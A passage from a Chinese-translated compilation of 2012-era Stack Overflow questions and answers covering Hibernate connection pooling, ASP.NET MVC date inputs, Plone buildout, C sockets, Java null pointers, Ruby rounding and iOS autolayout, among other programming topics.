即使我将提供者的名称更改为喜欢的类，我也会收到相同的警告。使用的正确类名是`hibernate.connection.provider_class`什么？是否有不是 c3p0 的用于生产用途的首选连接提供程序？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-23T12:36:05.167

我观察到同样的警告有一段时间了，并没有看到对我的应用程序的功能或性能有任何影响。但是今天我决定将我的**persistence.xml**中的条目（如警告消息本身所述）切换为：

```
<!-- C3p0 connection pooling configuration -->
<property name="hibernate.connection.provider_class" value="org.hibernate.service.jdbc.connections.internal.C3P0ConnectionProvider"/> 
```

这解决了这个问题；我也在使用**4.1.6Final**。

# asp.net-mvc - DateTime 属性作为视图中的两个输入，一个用于日期，第二个用于时间部分

> ID：13076573
> 
> 赞同：1
> 
> 时间：2012-10-25T20:17:38.360
> 
> 标签：asp.net-mvc, asp.net-mvc-4

这是否可能在模型中有一个 DateTime 属性，但将其用作视图/表单的两个输入？例如，日期部分将使用 jqueryui datepicker，而时间部分选择器将是一个掩码输入，或其他漂亮的 jquery 插件。有时我需要使用两个下拉菜单进行时间选择（小时和分钟）。

我的目标是在模型中有一个 DateTime 属性（日期和时间没有部分字符串）。这可能吗？使用 MVC4。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T07:40:30.703

Here's a technique i use to split a date into 3 fields, while only having 1 DateTime property on the ViewModel. While not exactly what you're after, you should be able to use a similar method to achieve what you want.

**Editor Template** */views/shares/editortempaltes/datetime.cshtml*

```
@model Nullable<System.DateTime>         
@Html.TextBox("Day", Model.HasValue ? Model.Value.Day.ToString() : "", new { Type = "Number", @class="date-day" })
@Html.ValidationMessage("Day")
@Html.DropDownList("Month", months, new { @class="date-month" })
@Html.ValidationMessage("Month")
@Html.TextBox("Year", Model.HasValue ? Model.Value.Year.ToString() : "", new { Type = "Number", @class="date-year" })
@Html.ValidationMessage("Year") 
```

**Custom ModelBinder**

```
public object GetValue(ControllerContext controllerContext, ModelBindingContext bindingContext, PropertyDescriptor propertyDescriptor)
{
    int day, month, year;

    if (TryGetValue(controllerContext, bindingContext, propertyDescriptor.Name + ".Day", out day) && TryGetValue(controllerContext, bindingContext, propertyDescriptor.Name + ".Month", out month) && TryGetValue(controllerContext, bindingContext, propertyDescriptor.Name + ".Year", out year))
    {
        try
        {
            return new DateTime(year, month, day);
        }
        catch (ArgumentOutOfRangeException)
        {
            var fullPropertyName = bindingContext.ModelName + "." + propertyDescriptor.Name;               
            bindingContext.ModelState[fullPropertyName] = new ModelState();                         
            bindingContext.ModelState[fullPropertyName].Errors.Add("Invalid date");
        }
    }
    return null;
}

private bool TryGetValue(ControllerContext controllerContext, ModelBindingContext bindingContext, string propertyName, out int value)
{
    var fullPropertyName = bindingContext.ModelName + "." + propertyName;
    string stringValue = controllerContext.HttpContext.Request[fullPropertyName];
bindingContext.ModelState.Add(fullPropertyName, new ModelState() { Value = new ValueProviderResult(stringValue, stringValue, null) });
    return int.TryParse(stringValue, out value);
} 
```

**Usage** Add a DateTime property to your ViewModel, then call

```
@Html.EditorFor(m => m.DateTimeProperty) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T07:25:35.600

作为建议的解决方案的替代方案，您可以使用映射到 DateTime 属性的隐藏字段，并在表单上的某些控件更改日期的一部分时使用 Javascript 在客户端相应地对其进行修改。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T20:50:59.220

是的你可以。如果您尝试将值传递给字段，只需将模型传递给视图并使用 DateTime 即可。

要取回数据，您可以返回 2 DateTime（一个代表秒，一个代表时间）并在控制器中组合 2 个日期。

如果您需要更具体的帮助，请向我们展示您在代码中遇到的问题，以便我们可以帮助您实施

# plone - Plone 4.1 - 在设置全新安装时运行 bin/buildout 崩溃 - zope.configuration 3.7.4。未识别

> ID：13076575
> 
> 赞同：0
> 
> 时间：2012-10-25T20:17:43.873
> 
> 标签：plone, zope, buildout

我正在使用 Plone 4.1 并尝试`bin/buildout`在新目录中运行，刚刚设法开始`python bootstrap.py --distribute`工作。 `bin/buildout`运行了几分钟，下载了各种发行版，然后崩溃并出现以下报告：

```
Getting distribution for 'plone.recipe.zope2instance==4.1.7'.
Got plone.recipe.zope2instance 4.1.7.
... (many distributions omitted for brevity) ...
Getting distribution for 'zope.container==3.11.2'.
Got zope.container 3.11.2.
Getting distribution for 'zope.configuration==3.7.4'.
error: Not a recognized archive type: /Users/Jon/.buildout/downloads/dist/zope.configuration-3.7.4.zip
An error occured when trying to install zope.configuration 3.7.4\. Look above this message for any errors that were output by easy_install.
While:
  Installing.
  Getting section instance.
  Initializing section instance.
  Installing recipe plone.recipe.zope2instance.
  Getting distribution for 'zope.configuration==3.7.4'.
Error: Couldn't install: zope.configuration 3.7.4 
```

看起来重要的错误消息是：**Not a Recognized archive type: /Users/Jon/.buildout/downloads/dist/zope.configuration-3.7.4.zip**

顺便说一句，我尝试简单地重新运行`bin/buildout`它并在一个新的地方捡起，从：

```
Getting distribution for 'zdaemon==2.0.4'.
Got zdaemon 2.0.4.
Getting distribution for 'pytz==2011g'.
Got pytz 2011g. 
```

...等等。我可以继续重试脚本，直到它成功获得所需的所有内容吗？

另外，我尝试`bin/buildout`在另一个目录中运行 4.2 版，这似乎工作正常。

**编辑**我第二次运行`bin/buildout`它完成而没有崩溃。但是，我对输出进行了搜索，但它从未下载过任何名称中带有“配置”的内容。那么发生了什么？？？

**编辑**为了很好的衡量，我尝试`bin/buildout`第三次运行，并在打印单行“更新实例”后迅速退出。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T20:53:38.183

你没事。我怀疑您的网络连接不太理想和/或 PyPI 有问题（我认为您的其他帖子之一也是关于网络相关问题的）。

您看到的错误是它试图下载已损坏的 zip 文件，因此无法提取 zip 文件。在您第二次尝试时，它成功下载了它。

# windows - MSysGit 找不到回购

> ID：13076578
> 
> 赞同：0
> 
> 时间：2012-10-25T20:18:02.960
> 
> 标签：windows, git

因此，我通过将其添加到 apache 中的 htdocs 中进行了回购，但是，我无法提交。所以我设置了 SSH（我正在使用 copSSH），我可以通过 ssh 进入服务器并查看我的 project.git 中的文件。但是，当我尝试克隆时，我得到以下信息......

> $ git clone un@server:/home/un/Repositories/git/test.git/
> 
> 克隆到“测试”...
> 
> un@server 的密码：
> 
> 致命：'/home/un/Repositories/git/test.git/' 似乎不是 git 存储库
> 
> 致命：无法从远程存储库中读取。
> 
> 请确保您具有正确的访问权限并且存储库存在。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:20:05.563

哎呀，这确实有效...

> git clone un@server:Repositories/git/test.git/

必须是环境变量问题

# html - 页面中的下拉菜单如何放大页面？

> ID：13076579
> 
> 赞同：2
> 
> 时间：2012-10-25T20:18:04.100
> 
> 标签：html, css

我有一个 HTML 页面，其中页面的主体缩放如下：

```
body {
    background: #E0D5B7 url(img/page_bg.jpg) repeat-x;
    margin:auto;
    width:1000px;
    padding-top:100px;
    zoom: 1.165; -moz-transform: scale(1.165);
} 
```

然而，由于下拉菜单没有重新调整大小（缩放），因此很难做出正确的选择。例如：如果用户选择索引 5 处的值，则它会采用索引 3 处的值，因为下拉菜单未根据正文进行缩放。我怎么能做到这一点？有没有其他方法可以做到这一点？

下面是我为该页面提供的下拉菜单。

```
<tr id="sped-limit">
    <td height="70">
        <label>Speed Limit (mph)</label>
        <br>
        <div class="drop-down">
        <select id="Drop-Down-Speed" name="Speed Limit Selection">
        <option >Select Speed</option>
        <option>25</option>
        <option>30</option>
        <option>35</option>
        <option>40</option>
        <option>45</option>
        <option>50</option>
        <option>55</option>
        </select></div>
    </td>
</tr> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T00:44:43.347

由于菜单是文本，为什么不创建一个选项来使文本更大以及 [在调整窗口大小时自动调整文本大小（字体大小）？](https://stackoverflow.com/questions/2989950/auto-resize-text-font-size-when-resizing-window)

# javascript - 将弹出窗口中的图像添加到父页面

> ID：13076580
> 
> 赞同：1
> 
> 时间：2012-10-25T20:18:07.127
> 
> 标签：javascript, jquery, popup

我编写了一个简单的图像编辑器 PHP 脚本，用户可以将画廊中的图像添加到编辑器区域并最终合并。

现在我的问题是：

画廊作为弹出窗口打开，编辑器区域是父页面，当用户单击弹出页面中的项目时，我需要一个 javascript 或 jquery 代码，图像添加到特定 div 中的父页面。

这是目标 div 代码：

```
 <div id="objects">
            <div class="obj_item"><img id="obj_1" class="ui-widget-content" src="elements/1.png" /></div>
            <div class="obj_item"><img id="obj_2" class="ui-widget-content" src="elements/2.png" /></div>
        </div> 
```

请帮助我，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:57:00.083

您可以使用`window.opener`

```
$('#objects', window.opener).append('image code'); 
```

# grails - 在 Rich-ui 树视图中合并图像

> ID：13076582
> 
> 赞同：1
> 
> 时间：2012-10-25T20:18:08.820
> 
> 标签：grails, treeview, rich-ui

我在 Grails 应用程序中使用 Rich-UI 插件树视图功能。我让它工作，但试图看看如何在树视图中合并一个 pdf 图标/图像，以向用户识别他们可以从链接启动一个 pdf。有人可以向我解释如何在树视图中放置图像吗？任何有关文件名等的帮助将不胜感激。

# github - 创建拉取请求时出现 500 错误

> ID：13076584
> 
> 赞同：3
> 
> 时间：2012-10-25T20:18:11.993
> 
> 标签：github

每当我尝试在 github 上的 fork 上创建拉取请求时，我总是会收到“500 错误”，我只是继续尝试，在某些时候页面加载（它是。是否有任何更新或我必须做的事情。 ?

我的叉子与我叉出的分支是最新的。不知道如何解决它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-06-05T22:39:16.030

我遇到了同样的问题——`https://github.com/[your account]/[repository]/pull/new`从那个页面创建一个 PR 对我有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T09:58:40.050

我猜 500 错误的 url 就像 https://github.com/[your account]/[repository]/pull/new/[branch]。

您可以通过 https://github.com/[your account]/[repository]/pull/new 之类的 URL 访问来避免 500 错误，然后您可以选择一个分支来发送拉取请求。

# mysql - 使用 Linux 终端登录 MySql 没有响应

> ID：13076585
> 
> 赞同：1
> 
> 时间：2012-10-25T20:18:16.123
> 
> 标签：mysql, linux

我尝试使用 root 用户名（默认）在 localhost 中登录 MySQL，没有密码，输入以下命令：

```
mysql -u root -h localhost 
```

我没有得到'mysql>'并且它没有失败，所以我留下了终端让我输入，但它不执行任何命令（在mysql内部或外部）。我也尝试使用 -p 并将密码留空，我得到了相同的结果

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:38:56.580

检查以下内容（取自[http://dev.mysql.com/doc/mysql-linuxunix-excerpt/5.5/en/unix-postinstallation.html](http://dev.mysql.com/doc/mysql-linuxunix-excerpt/5.5/en/unix-postinstallation.html)）

使用 mysqladmin 验证服务器是否正在运行。以下命令提供了简单的测试来检查服务器是否启动并响应连接：

```
shell> bin/mysqladmin version
shell> bin/mysqladmin variables 
```

mysqladmin 版本的输出根据您的平台和 MySQL 版本略有不同，但应该与此处显示的类似：

```
shell> bin/mysqladmin version
mysqladmin  Ver 14.12 Distrib 5.5.29, for pc-linux-gnu on i686
...
Server version          5.5.29
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/lib/mysql/mysql.sock
Uptime:                 14 days 5 hours 5 min 21 sec
Threads: 1  Questions: 366  Slow queries: 0
Opens: 0  Flush tables: 1  Open tables: 19
Queries per second avg: 0.000 
```

如果您无法运行该命令，那么您的安装要么未完成（按照从页面顶部开始的说明进行操作），要么您没有作为用户执行 mysql 程序的权限。

# postgresql - 在 postgresql 中没有外键的 ON UPDATE CASCADE

> ID：13076586
> 
> 赞同：1
> 
> 时间：2012-10-25T20:18:23.553
> 
> 标签：postgresql, sql-update, cascade

我有一些表需要在 postgresql 中进行级联更新，但我认为我不能使用外键来做到这一点。

简单的版本是我有 4 个对象表和 2 个绑定表：

```
Table X    Table A       Table A-B      Table B      Table B-C    Table C
-------    --------      ---------      -------      ---------    -------
x_id         a_id           x_id          b_id          x_id        c_id
...          ...            a_id          ...           b_id        ...
...          ...            b_id          ...           c_id        ...
                            ...                         ... 
```

在我的绑定表上，我对所有 id 字段（x_id、a_id、b_id）、（x_id、b_id、c_id）都有一个 PK。

如果我更新表 AB 中的 b_id，我希望它更新表 BC 中 x_id 匹配的 b_id。

如果我尝试创建外键约束，它会告诉我

“引用表的给定键没有唯一约束匹配......”

我知道它没有这样做，因为（x_id，b_id）不是唯一的约束，但它不可能，因为我将有多个 c_id 具有相同的 b_id 和 x_id。

希望这是有道理的。

是用触发器做到这一点的唯一方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T23:40:02.060

> 我知道它没有这样做，因为（x_id，b_id）不是唯一的约束，但它不可能，因为我将有多个 c_id 具有相同的 b_id 和 x_id。

为了将表 AB 中的 b_id 更新到表 BC，您需要

*   对包含 Table_A-C.b_id 的一组列的唯一约束，
*   Table_B-C 中的同一组列，以及
*   Table_B-C 中的外键引用引用 Table_A-C 中的同一组列，并带有 ON UPDATE CASCADE。

我不清楚您目前的结构是否可行。

如果

*   Table_A-B.x_id 是一个自增整数，它本身是唯一的，那么
*   在 Table_A-B 中，列集合 {x_id, b_id} 也将是唯一的，并且
*   在 Table_B-C 中，列 x_id 是一个整数（或 bigint），那么
*   在 Table_B-C 中，列集合 {x_id, b_id} 可以具有对 Table_A-C 的外键引用。

# c++ - VC11 Winsock 应用程序不会关闭

> ID：13076588
> 
> 赞同：1
> 
> 时间：2012-10-25T20:18:26.703
> 
> 标签：c++, visual-studio-2012, winsock2

对于似乎不会关闭的 Winsock 应用程序，我有一个有趣的场景。以下代码足以完全复制该问题：

```
#include "stdafx.h"

#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")

#include <WS2tcpip.h>
#include <MSTcpIP.h>
#include <ws2ipdef.h>

#include <cstdio>
#include <iostream>

using namespace std;

int main() {
    WSAData wsaStartup;
    WSAStartup(MAKEWORD(2, 2), &wsaStartup);

    SOCKET s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

    addrinfo *result;
    addrinfo hint = { 0 };
    hint.ai_family = AF_INET6;

    int error = getaddrinfo("localhost", "45000", &hint, &result);

    if (error || !result) {
        cout << "Unable to resolve host. " << WSAGetLastError() << endl;
        return 1;
    }

    error = connect(s, result->ai_addr, result->ai_addrlen);

    if (error == SOCKET_ERROR) {
        cout << "Unable to connect to host. " << WSAGetLastError() << endl;
    } else {
        cout << "Connection successful." << endl;
    }

    freeaddrinfo(result);
    closesocket(s);
    WSACleanup();
    return 0;
} 
```

我花了很多时间试图追查这个问题。似乎 getaddrinfo 和 connect 都产生了一个挂起的 nt 线程，并防止应用程序终止。

我在这里更改的唯一重要的编译器选项是：Linker->Advanced->EntryPoint，我在其中指定了“main”。如果我摆脱该编译器选项，并将主签名更改为：

```
int _tmain(int argc, _TCHAR* argv[]) 
```

一切似乎都很好。在我的用例中，我很好地拥有上面的 _tmain 函数，但我想知道是否有人知道 _tmain 函数的幕后发生了什么魔力，它使应用程序关闭。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T21:17:36.300

[如何在 Visual Studio 中正确设置 exe 的入口点？](https://stackoverflow.com/questions/8790923/how-do-i-correctly-set-the-entry-point-for-an-exe-in-visual-studio)

也许您需要为 main() 提供正确的签名以匹配运行时的期望。

# osgi - OSGi 和 Virgo 工具：无法添加 maven 项目（使用 bnd maven 插件）

> ID：13076591
> 
> 赞同：2
> 
> 时间：2012-10-25T20:18:37.003
> 
> 标签：osgi, m2eclipse, facet, eclipse-virgo, bnd

我是 OSGi 的新手，只编写了几个包并手动部署它们。我的一些朋友告诉我有关 Virgo 和 Virgo 工具的信息，它们允许您自动部署使用 eclipse 管理的包。

我目前正在尝试设置所有这些。我有 virgo-tomcat-server-3.5.0.RELEASE，以及 virgo 工具 1.0.0，所有这些都安装在 Spring Tool Suite 3.1.0.RELEASE 上（如果你不知道，最后一个包括m2eclipse 插件）。

我的包是一个 Maven 项目。它使用 bnd 插件，这是它的配置

```
<plugin>
<groupId>org.apache.felix</groupId>
<artifactId>maven-bundle-plugin</artifactId>
<extensions>true</extensions>
<configuration>
    <instructions>
        <Export-Package>fr.tpepio.mtg.model</Export-Package>
    </instructions>
</configuration>
<executions>
    <execution>
        <id>build-manifest</id>
        <phase>compile</phase>
        <goals>
            <goal>manifest</goal>                           
        </goals>                        
    </execution>
</executions> 
```

你可以看到我只导出了一个包。我还尝试让 m2eclipse 在 eclipse 编译我的类时动态生成我的 manifest.mf 文件。

我终于解决了我面临的问题。

1.  由于我将我的包作为 maven 项目导入到 STS 中，因此我必须向其中添加 Virgo 方面。一旦我更新了我的 Maven 配置，它就会搞砸我的项目，并且我收到以下错误：

    ```
    Java compiler level does not match the version of the installed Java project facet. 
    ```

2.  Appart from my (shitty) maven configuration，我发现自己无法将我的项目添加到 virgo 服务器，这无休止地告诉我

    ```
    null reason : null 
    ```

有人有任何线索吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T10:01:26.220

万岁！问题解决了。

第一：关于java编译器和facet的java版本。告诉 maven 您的源代码是在 1.6 中编码的，并且必须在 1.6 中编译将解决问题。代码如下：

```
<plugin>
<groupId>org.apache.maven.plugins</groupId>
<artifactId>maven-compiler-plugin</artifactId>
<version>2.3.2</version>
<inherited>true</inherited>
<configuration>
    <verbose>false</verbose>
    <encoding>${java.compiler.encoding}</encoding>
    <fork>true</fork>
    <source>${java.compile.version}</source>
    <target>${java.compile.version}</target>
</configuration> 
```

我仍然不明白为什么它解决了这个问题，因为我的项目配置和 STS 配置都只能使用 java 6 ......我相信这是因为我的源代码编译为 1.5 java 源代码。

第二：将maven bundle项目添加到virgo。

1.  正确配置 bnd，通过在正确的 maven 阶段运行它的“清单”目标（例如：在你的类被编译之后），并告诉他在哪里可以找到清单。这解决了“空原因：空”问题（也许处女座应该说：“找不到 manifest.mf ...？）。

    ```
    <plugin>
    <groupId>org.apache.felix</groupId>
    <artifactId>maven-bundle-plugin</artifactId>
    <version>2.3.7</version>
    <extensions>true</extensions>
    <configuration>
            <instructions>
                    <Bundle-SymbolicName>${project.groupId}.${project.artifactId}</Bundle-SymbolicName>
                    <Bundle-Name>${project.name}</Bundle-Name>
                    <Bundle-Version>${project.version}</Bundle-Version>
                    <Bundle-ClassPath>.</Bundle-ClassPath>
                    <Export-Package>
                            [packages you want to export]
                    </Export-Package>
            </instructions>
    </configuration>
    <executions>
            <execution>
                    <id>bundle-manifest</id>
                    <phase>process-classes</phase>
                    <goals>
                            <goal>manifest</goal>
                    </goals>
                    <configuration>
                            <manifestLocation>src/main/resources/META-INF/</manifestLocation>
                    </configuration>
            </execution>
    </executions> 
    ```

2.  将此目标添加到 m2eclipse 生命周期映射中。这会在每次出现您在 bnd 配置中指定的阶段后刷新您的清单（此处为：流程类阶段）。否则，m2eclipse 无法理解何时应该调用您的目标。

    ```
    <pluginManagement>
    <plugins>
            <!--This plugin's configuration is used to store Eclipse m2e settings only. It has no influence on the Maven build itself.-->
            <plugin>
                    <groupId>org.eclipse.m2e</groupId>
                    <artifactId>lifecycle-mapping</artifactId>
                    <version>1.0.0</version>
                    <configuration>
                            <lifecycleMappingMetadata>
                                    <pluginExecutions>
                                            <!-- Maven Bundle Plugin -->
                                            <pluginExecution>
                                                    <pluginExecutionFilter>
                                                            <groupId>org.apache.felix</groupId>
                                                            <artifactId>maven-bundle-plugin</artifactId>
                                                            <versionRange>[2.3.7,)</versionRange>
                                                            <goals>
                                                                    <goal>manifest</goal>
                                                            </goals>
                                                    </pluginExecutionFilter>
                                                    <action>
                                                            <execute>
                                                                    <runOnIncremental>false</runOnIncremental>
                                                            </execute>
                                                    </action>
                                            </pluginExecution>
                                    </pluginExecutions>
                            </lifecycleMappingMetadata>
                    </configuration>
            </plugin>
    </plugins> 
    ```

希望这会有所帮助。

# ruby - 固定数字的 Ruby 大十进制舍入

> ID：13076593
> 
> 赞同：6
> 
> 时间：2012-10-25T20:18:45.647
> 
> 标签：ruby, rounding

我想`BigDecimal`用红宝石四舍五入。我知道我可以使用圆形功能，但是

圆形函数给出

```
(3.2).round(2) =>  3.2 
```

我想

```
(3.2).round(2) =>  3.20
(3.20).round(2) =>  3.20
(3).round(2) =>  3.00
(3.578).round(2) =>  3.58 
```

我总是希望有 2 个小数位，3.20 而不是 3.2

知道如何完成这项工作吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-10-25T20:24:30.763

尝试这个：

```
'%.2f' % 3.2
=> "3.20"

'%.2f' % 3
=> "3.00"

'%.2f' % 3.578
=> "3.58"

etc. 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-25T20:27:25.790

例如，与[Java 的 BigDecimal](http://docs.oracle.com/javase/1.5.0/docs/api/java/math/BigDecimal.html)不同，[Ruby 的 BigDecimal](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/bigdecimal/rdoc/BigDecimal.html)没有每个实例的精度。Ruby BigDecimal 中 3.2 和 3.20 之间的区别只是格式化。

# c - 在C中从客户端->服务器和服务器->客户端套接字传递多条消息

> ID：13076596
> 
> 赞同：0
> 
> 时间：2012-10-25T20:19:02.817
> 
> 标签：c, sockets

有人可以帮助确定为什么我的服务器不能接受来自客户端的多条消息吗？

我试图让流程如下所示：
1\. 客户端向服务器发送消息大小
2\. 服务器接收大小并发送回响应。在这种情况下为 0。
3\. 客户端检查响应，然后将消息写入服务器。
4\. 服务器读取消息并打印出来。

我遇到的问题是第 4 步的 accept() 永远不会解除阻塞。

客户

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char *argv[])
{
int sock = socket(AF_INET, SOCK_STREAM, 0);

struct sockaddr_in s_address;
s_address.sin_family = AF_INET;
s_address.sin_port = htons(51717);
s_address.sin_addr.s_addr = INADDR_ANY;
if (connect(sock, (struct sockaddr *) &s_address, sizeof(s_address)) < 0) {
    printf("ERROR: Cannot connect()\n");
    exit(0);
}

char *org_msg = "Hello";

printf("Writing size of Hello\n");
char msg1[1];
msg1[0] = sizeof(org_msg);
write(sock, msg1, sizeof(msg1));

printf("Waiting for response from server\n");
struct sockaddr_in c_address;
socklen_t c_length = sizeof(c_address);
int new_sock = accept(sock, (struct sockaddr *) &c_address, &c_length);

printf("Reading response from server\n");
char stat[1];
read(new_sock, stat, 1);

if (atoi(stat) == 0) {
    printf("Writing Hello to server\n");
    write(sock, org_msg, sizeof(org_msg));
}
close(sock);
close(new_sock);
} 
```

服务器

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char *argv[])
{
int sock = socket(AF_INET, SOCK_STREAM, 0);

struct sockaddr_in s_address;
s_address.sin_family = AF_INET;
s_address.sin_port = htons(51717);
s_address.sin_addr.s_addr = INADDR_ANY;
if (bind(sock, (struct sockaddr *) &s_address, sizeof(s_address)) < 0) {
    printf("ERROR: Cannot bind()\n");
    exit(0);
}

listen(sock, 3);

printf("Waiting for client message\n");
struct sockaddr_in c_address;
socklen_t c_length = sizeof(c_address);
int new_sock = accept(sock, (struct sockaddr *) &c_address, &c_length);

printf("Reading client message\n");
char msg[1];
read(new_sock, msg, 1);

printf("Writing response to client\n");
char stat[1];
stat[0] = '0';
write(new_sock, stat, sizeof(stat));

printf("Waiting for client message\n");
int new_sock2 = accept(sock, (struct sockaddr *) &c_address, &c_length);

printf("Reading client message\n");
char msg2[atoi(msg)];
read(new_sock2, msg2, sizeof(msg2));

printf("MESSAGE: %s\n", msg2);

close(sock);
close(new_sock);
close(new_sock2);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:52:37.400

您不应调用`accept()`已连接的套接字。一旦您在服务器中有一个连接的套接字（由 返回的套接字`accept()`），您应该继续读取和写入该套接字，直到连接关闭。服务器的步骤应类似于：

```
listen_socket = socket(...);
listen(listen_socket, ...);
connected_socket = accept(listen_socket, ...);
read(connected_socket, ...)
write(connected_socket, ...)
read(connected_socket, ...)
write(connected_socket, ...)
... 
```

同样，一旦成功连接，客户端应该继续读取和写入套接字 - 客户端的步骤应该是：

```
connected_socket = socket(...);
connect(connected_socket, ...);
write(connected_socket, ...);
read(connected_socket, ...);
write(connected_socket, ...);
read(connected_socket, ...);
... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:22:37.463

`INADDR_ANY`在服务器中工作，但您的客户端需要指定它连接到的主机。

如果两者都在同一台机器上，只需使用 127.0.0.1 或 localhost （您必须进行转换以使其格式正确）

更多信息[在这里](https://stackoverflow.com/questions/6081892/does-sin-addr-s-addr-inaddr-any-need-htonl-at-all)，但简短的回答是

```
#define INADDR_LOOPBACK 0x7f000001 
```

接着`s_address.sin_addr.s_addr = htonl (INADDR_LOOPBACK)`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:30:49.893

在客户端上，您尝试接受与先前连接到服务器的套接字的新连接，该套接字将绑定到系统选择的端口号。服务器从不尝试连接到客户端，因此客户端`accept`上的调用永远不会返回（实际上它可能会返回但有错误，因为您从不调用`listen`该套接字）。

为什么不使用前面步骤中使用的相同套接字执行步骤 3？如果出于某种原因您确实需要一个新套接字，则应在客户端中创建一个新套接字，而不是重用前一个套接字（或调用`close`前一个套接字，然后`connect`再次调用它）。

顺便说一句，如果您只需要 IPC，那么套接字是一种非常糟糕的方法。我建议使用 Java RMI 之类的东西。

# java - 为什么我得到 nullPointerException

> ID：13076600
> 
> 赞同：0
> 
> 时间：2012-10-25T20:19:10.930
> 
> 标签：java, arraylist, nullpointerexception

我有以下代码；但是，似乎我正在访问数组列表中不存在的索引......这是代码。任何帮助表示赞赏。

```
import java.util.*;

public class Main {

    public static void main(String[] args) {

        ArrayList<BankAccount> allAccounts = new ArrayList<BankAccount>();

        Customer john = new Customer();
        john.firstName = "John";
        john.lastName = "Doe";

        BankAccount johnBa = new BankAccount();
        johnBa.accNumber = "111-222-333";
        johnBa.balance = 200;
        johnBa.myCustomer = john;

        Customer nick = new Customer();
        nick.firstName = "Nick";
        nick.lastName = "James";

        BankAccount nickBa = new BankAccount();
        nickBa.accNumber = "222-333-444";
        nickBa.balance = 100;

        allAccounts.add(johnBa);
        allAccounts.add(nickBa);

        ArrayList<Customer> allCust = new ArrayList<Customer>();
        allCust = extractCustomers(allAccounts);

        for(Customer c : allCust) {
            System.out.println(c.firstName+" "+c.lastName);
        }       

    }

    static ArrayList<Customer> extractCustomers(ArrayList<BankAccount> ba) {
        ArrayList<Customer> cu = new ArrayList<Customer>();

        for(BankAccount b: ba) {
            cu.add(b.myCustomer);
        }

        return cu;
    }

}

public class BankAccount {

    String accNumber;
    double balance; 

    Customer myCustomer;

}

public class Customer {

    String firstName;
    String lastName;

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T20:21:19.093

```
 BankAccount nickBa = new BankAccount();
        nickBa.accNumber = "222-333-444";
        nickBa.balance = 100; 
```

没有客户第二次分配到这里`BankAccount`。

但是，您正在尝试打印客户详细信息。对于第二个`BankAccount`c 将是`null`. 对引用的任何操作都会`null`导致`NullPointerException`.

```
 for(Customer c : allCust) {
            System.out.println(c.firstName+" "+c.lastName);
        } 
```

`null`在对 c 进行任何调用以避免之前确保 c 不是`NullPointerException`。

```
 for(Customer c : allCust) {
           if(c != null){
            System.out.println(c.firstName+" "+c.lastName);
               }
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:25:52.623

您需要在 BankAccount 类中初始化您的 Customer obj，如下所示。

```
Customer myCustomer = new Customer(); 
```

也不建议像您正在做的那样访问类变量。创建 get 和 set 方法并通过调用 getCustomer() 访问您的 Customer obj

# objective-c - 带有约束的 UIStoryboard 自动布局问题

> ID：13076623
> 
> 赞同：0
> 
> 时间：2012-10-25T20:20:36.143
> 
> 标签：objective-c, xcode, constraints, uistoryboard, autolayout

非常简单（我希望）的自动布局问题，我正在用头撞我的 iMac。

我有这个肖像

![在此处输入图像描述](../Images/8d37930b86c763da474ea55d64ebaeb8.png)

这就是风景中发生的事情。

![在此处输入图像描述](../Images/608dd014c66401a1c980cf4937a47f5e.png)

我想要的只是让标签像不使用自动布局时那样展开。我要添加什么约束来均匀地间隔它们？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T19:40:50.137

有一个比@sust86 更简单、更灵活的解决方案：

1.  引入充当标签之间*弹簧的空视图。*
2.  连接所有具有恒定距离约束的相邻视图。
3.  将一个新的弹簧视图与具有相等宽度约束的所有其他弹簧视图连接起来。
4.  删除任何不需要的约束。

对我来说，约束看起来类似于：

![在此处输入图像描述](../Images/9ead541e9e0319c0c7de0579dfbdadc4.png)

这种配置的优点是，当标签（在我的例子中是按钮）的宽度发生变化时，您不需要修复任何间距。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T21:43:01.560

在 iOS 6 中使用新的约束是很棘手的。在 ray 的网站上有一个很好的 2 部分教程，与 iOS 6 中的自动布局相关。虽然它解释了如何在自动布局中锚定图像持有者，但这些原则帮助我理解了整个自动布局。希望这对你也有帮助。这里是链接： [http](http://www.raywenderlich.com/20881/beginning-auto-layout-part-1-of-2) ://www.raywenderlich.com/20881/beginning-auto-layout-part-1-of-2 Adrian

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-24T05:41:54.750

试试这个：

```
#define moneyLabelWidth 20
@property (nonatomic, strong) UILabel* moneyOneLabel;
@property (nonatomic, strong) UILabel* moneyTwoLabel;
@property (nonatomic, strong) UILabel* moneyThreeLabel;
@property (nonatomic, strong) UILabel* moneyFourLabel;
